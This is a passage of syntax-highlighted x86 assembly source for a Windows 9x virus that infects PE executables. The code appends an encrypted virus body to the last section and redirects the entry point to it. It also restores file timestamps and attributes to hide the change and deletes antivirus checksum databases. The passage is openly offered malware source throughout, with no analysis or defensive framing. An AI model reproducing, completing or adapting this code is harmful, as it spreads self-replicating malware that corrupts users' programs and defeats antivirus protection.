                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek2last_sh</span><span class="sc0">                       </span><span class="sc1">;Seek to last section</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">                           </span><span class="sc1">;in file and read it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00003F00h</span><span class="sc0">                       </span><span class="sc1">;Avoid files with the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">     </span><span class="sc1">;IMAGE_SCN_MEM_SHARED</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">section_header</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;flag</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_int21h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">section_header</span><span class="sc4">+</span><span class="sc5">SH_Characteristics</span><span class="sc4">],</span><span class="sc0"> \
                                                  </span><span class="sc5">IMAGE_SCN_MEM_SHARED</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">optional_header</span><span class="sc4">+</span><span class="sc0"> \
                              </span><span class="sc5">OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;Save original </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">original_ep</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;entry-point rva</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_eof</span><span class="sc0">                           </span><span class="sc1">;Seek to EOF</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;Save file size</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">inf_size</span><span class="sc0">                        </span><span class="sc1">;Add virus size</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">decryptor_size</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;Add decryptor size</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SIZE_PADDING</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">padding_block</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">section_header</span><span class="sc4">+</span><span class="sc0"> \    </span><span class="sc1">;New SizeOfRawData</span><span class="sc0">
                               </span><span class="sc5">SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">optional_header</span><span class="sc4">+</span><span class="sc0"> \
                               </span><span class="sc5">OH_SizeOfImage</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">      </span><span class="sc1">;New size of image</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">mem_size</span><span class="sc4">-</span><span class="sc5">inf_size</span><span class="sc4">]</span><span class="sc0">
                
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">section_header</span><span class="sc4">+</span><span class="sc0"> \    </span><span class="sc1">;New VirtualSize</span><span class="sc0">
                               </span><span class="sc5">SH_VirtualSize</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">section_header</span><span class="sc4">+</span><span class="sc0">  \    </span><span class="sc1">;Set section</span><span class="sc0">
                              </span><span class="sc5">SH_Characteristics</span><span class="sc4">],</span><span class="sc0"> \    </span><span class="sc1">;characteristics</span><span class="sc0">
                              </span><span class="sc5">IMAGE_SCN_MEM_READ</span><span class="sc0">   \
                              </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;Get file size</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">section_header</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">section_header</span><span class="sc4">+</span><span class="sc5">SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">                       
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infected_ep</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;RVA of virus code</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">entry_point</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;Entry to decryptor</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">inf_size</span><span class="sc4">-</span><span class="sc2">00000005h</span><span class="sc0">              </span><span class="sc1">;Virus size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">optional_header</span><span class="sc4">+</span><span class="sc0"> \   
                        </span><span class="sc5">OH_AddressOfEntryPoint</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;New entry-point</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">scramble_virus</span><span class="sc0">                     </span><span class="sc1">;Perform encryption</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00004000h</span><span class="sc0">                       </span><span class="sc1">;Write virus body</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">inf_size</span><span class="sc0">                        </span><span class="sc1">;at EOF</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">decryptor_size</span><span class="sc4">]</span><span class="sc0">  
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">padding_block</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_base</span><span class="sc4">+</span><span class="sc5">mem_size</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">-</span><span class="sc2">00000004h</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">   </span><span class="sc1">;Save bytes written</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_int21h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

                </span><span class="sc1">;Get position of last section into file and write the</span><span class="sc0">
                </span><span class="sc1">;infected header data</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek2last_sh</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00004000h</span><span class="sc0">                       </span><span class="sc1">;Write section </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">     </span><span class="sc1">;header</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">section_header</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_int21h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

                </span><span class="sc1">;Write PE header and part of Optional Header</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek2pe_header</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00004000h</span><span class="sc0">                       </span><span class="sc1">;Write headers</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc4">+</span><span class="sc2">0000005Eh</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_signature</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_int21h</span><span class="sc0">

</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00003E00h</span><span class="sc0">                       </span><span class="sc1">;Close file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_int21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00007143h</span><span class="sc0">                       </span><span class="sc1">;LFN Ext attributes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                              </span><span class="sc1">;Set last write time</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">target_filename</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Ptr to filename</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_time</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;Original time</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_date</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;Original date</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_int21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00007143h</span><span class="sc0">                       </span><span class="sc1">;LFN Ext attributes</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;Set file attributes</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_attrib</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;Original attributes</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">target_filename</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Ptr to filename</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_int21h</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">del_fileptr</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;Delete AV checksum</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">                       </span><span class="sc1">;databases</span><span class="sc0">

</span><span class="sc5">delete_loop</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ptr_filename</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">insert_name</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">insert_name</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00007143h</span><span class="sc0">                       </span><span class="sc1">;LFN Ext attributes</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;Set file attributes</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;Blow up attributes</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">target_filename</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Ptr to filename</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_int21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00007141h</span><span class="sc0">                       </span><span class="sc1">;Delete file</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">target_filename</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_int21h</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">delete_loop</span><span class="sc0">                        </span><span class="sc1">;Delete next file</span><span class="sc0">

</span><span class="sc5">exit_infection</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hook_status</span><span class="sc4">],</span><span class="sc3">"FREE"</span><span class="sc0">  </span><span class="sc1">;Clear busy flag</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit_hook</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Simulate a int 21h using VxDCall to VWIN32_int21h_dispatcher</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">my_int21h</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">002A0010h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_VxDCall</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Move file pointer rotuines</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">seek_here</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;Seek to edx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFFF0000h</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00004200h</span><span class="sc0">                
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">seek_now</span><span class="sc0">

</span><span class="sc5">seek_bof</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;Seek to begin of file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00004200h</span><span class="sc0">                       
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">perform_seek</span><span class="sc0">

</span><span class="sc5">seek_eof</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;Seek to end of file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00004202h</span><span class="sc0">
</span><span class="sc5">perform_seek</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">seek_now</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_int21h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">exit_seek</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000FFFFh</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
</span><span class="sc5">exit_seek</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">seek2pe_header</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;Seek to PE header</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">msdos_header</span><span class="sc4">+</span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_here</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">seek2last_sh</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;Seek to last section header</span><span class="sc0">

                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_header</span><span class="sc4">+</span><span class="sc5">FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">msdos_header</span><span class="sc4">+</span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_header</span><span class="sc4">+</span><span class="sc5">FH_SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
